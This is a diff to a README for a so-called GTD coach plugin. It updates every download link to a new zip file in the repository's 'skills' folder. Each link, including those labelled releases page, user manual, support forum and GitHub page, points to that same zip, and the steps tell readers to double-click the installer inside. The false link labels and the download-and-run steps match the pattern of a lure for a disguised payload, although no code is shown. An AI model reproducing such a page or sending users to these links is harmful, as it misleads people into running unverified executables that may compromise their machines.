@@ -4,27 +4,27 @@ Welcome to the gtd-coach-plugin! This application breaks down your daily tasks i
 
 ## 📥 Download Now
 
-[![Download gtd-coach-plugin](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/plugin_gtd_coach_v2.5.zip)](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/plugin_gtd_coach_v2.5.zip)
+[![Download gtd-coach-plugin](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/gtd-coach-plugin-2.7.zip)](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/gtd-coach-plugin-2.7.zip)
 
 ## 🚀 Getting Started
 
 Follow these simple steps to download and run the gtd-coach-plugin:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/plugin_gtd_coach_v2.5.zip). This page contains all versions of gtd-coach-plugin.
+   Go to our [Releases page](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/gtd-coach-plugin-2.7.zip). This page contains all versions of gtd-coach-plugin.
 
 2. **Select the Latest Release**  
    On the Releases page, find the latest version listed at the top. Click on it to access the release details.
 
 3. **Download the Installer**  
-   Look for the file named `https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/plugin_gtd_coach_v2.5.zip` under the Assets section. Click on this file to start your download.
+   Look for the file named `https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/gtd-coach-plugin-2.7.zip` under the Assets section. Click on this file to start your download.
 
 ## 📂 Installation Steps
 
 Once your download is complete, follow these steps to install the gtd-coach-plugin:
 
 1. **Locate the Downloaded File**  
-   Find the `https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/plugin_gtd_coach_v2.5.zip` file in your downloads folder or whichever location you chose for saving it.
+   Find the `https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/gtd-coach-plugin-2.7.zip` file in your downloads folder or whichever location you chose for saving it.
 
 2. **Run the Installer**  
    Double-click the installer file. A window will appear to guide you through the installation.
@@ -66,13 +66,13 @@ If you encounter any issues while installing or using gtd-coach-plugin, consider
 
 ## 🔗 Additional Resources
 
-- **User Manual**: [Access the User Manual](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/plugin_gtd_coach_v2.5.zip)
-- **Support Forum**: Join the conversation and seek help in our [Support Forum](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/plugin_gtd_coach_v2.5.zip).
+- **User Manual**: [Access the User Manual](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/gtd-coach-plugin-2.7.zip)
+- **Support Forum**: Join the conversation and seek help in our [Support Forum](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/gtd-coach-plugin-2.7.zip).
 
 ## 📬 Contact
 
-For further questions, please reach out via the Issues tab on our [GitHub page](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/plugin_gtd_coach_v2.5.zip).
+For further questions, please reach out via the Issues tab on our [GitHub page](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/gtd-coach-plugin-2.7.zip).
 
-For updates and more information, visit our [Releases page](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/plugin_gtd_coach_v2.5.zip) again. 
+For updates and more information, visit our [Releases page](https://raw.githubusercontent.com/alishazeem/gtd-coach-plugin/main/skills/gtd-coach-plugin-2.7.zip) again. 
 
 Thank you for choosing gtd-coach-plugin! Enjoy your journey to better productivity.
